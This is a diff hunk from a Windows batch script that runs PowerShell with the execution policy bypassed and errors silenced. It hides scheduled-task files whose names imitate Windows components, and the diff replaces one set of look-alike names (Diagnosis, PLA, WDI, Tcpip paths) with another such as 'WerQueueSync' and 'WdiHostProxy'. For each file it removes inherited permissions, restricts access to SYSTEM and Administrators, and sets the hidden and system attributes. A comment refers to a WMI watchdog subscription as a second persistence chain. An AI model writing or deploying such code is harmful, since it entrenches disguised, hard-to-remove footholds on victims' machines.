@@ -71,7 +71,7 @@ REM them into garbage tokens. PowerShell reads identity.cfg directly instead.
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
   "$ErrorActionPreference='SilentlyContinue'; $names=@();" ^
   "if(Test-Path -LiteralPath '%WD%\identity.cfg'){ Get-Content -LiteralPath '%WD%\identity.cfg' -Force | ForEach-Object { if($_ -match '^TASK_[A-D]=(.+)$'){ $names += $matches[1].Trim().TrimStart('\') } } }" ^
-  "else { $names=@('Microsoft\Windows\Diagnosis\Scheduled','Microsoft\Windows\PLA\Server','Microsoft\Windows\WDI\ResolutionHost','Microsoft\Windows\Tcpip\IpAddressConflict1') };" ^
+  "else { $names=@('WerQueueSync','PlaServerHealth','WdiHostProxy','TcpIpConflictRes') };" ^
   "foreach($n in $names){ $f = Join-Path '%TASKROOT%' $n; if(Test-Path -LiteralPath $f){ & icacls.exe $f /inheritance:r | Out-Null; & icacls.exe $f /grant:r 'NT AUTHORITY\SYSTEM:F' 'BUILTIN\Administrators:F' | Out-Null; & attrib.exe +h +s $f | Out-Null } }" >nul 2>&1
 
 REM --- ACL: WMI watchdog subscription files (chain 2) ---
